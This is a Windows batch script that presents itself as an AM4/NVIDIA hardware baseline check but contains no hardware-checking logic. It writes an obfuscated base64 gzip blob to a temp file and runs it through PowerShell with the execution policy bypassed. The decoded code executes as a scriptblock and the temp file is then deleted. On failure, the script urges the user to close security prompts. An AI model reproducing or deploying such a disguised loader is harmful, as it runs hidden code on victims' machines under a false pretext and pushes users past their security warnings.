@echo off
setlocal
title Hardware check - AM4 + NVIDIA
echo.
echo   Hardware baseline check - AM4 + NVIDIA
echo   Reads this PC, compares it with the platform baseline, writes a report.
echo.
set "HCPAYLOAD=%TEMP%\hc-am4-nvidia.b64"
> "%HCPAYLOAD%" (
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo w1CMJjdemLzTbKO+OE6lXqnhMZAWE8kFtZoUWdHrlT59ASoWmENVDYQ1QM0vLJpwIDjNg9hP6Hrj58vDrcrybwHg3LsgGGpaFQCXZe23PhYV320fd36cnf847x2cyXkmc62pPGy4sfKUBfg5K2i2s+FkTPd9CHF1Bh/lN6Ut8P8BB5lMyD57AAA=
)
if not exist "%HCPAYLOAD%" goto :failed
powershell -NoProfile -ExecutionPolicy Bypass -Command "$p=Join-Path $env:TEMP 'hc-am4-nvidia.b64'; $b=(Get-Content -Raw $p) -replace '\s',''; $m=New-Object IO.MemoryStream(,[Convert]::FromBase64String($b)); $g=New-Object IO.Compression.GZipStream($m,[IO.Compression.CompressionMode]::Decompress); $r=New-Object IO.StreamReader($g,[Text.Encoding]::UTF8); $c=$r.ReadToEnd(); $r.Dispose(); & ([scriptblock]::Create($c))"
set "HCCODE=%ERRORLEVEL%"
del "%HCPAYLOAD%" >nul 2>nul
if not "%HCCODE%"=="0" goto :failed
echo.
echo   Done. Press any key to close.
pause >nul
exit /b 0
:failed
echo.
echo   The check did not finish. Close any security prompt and run it again.
pause >nul
exit /b 1
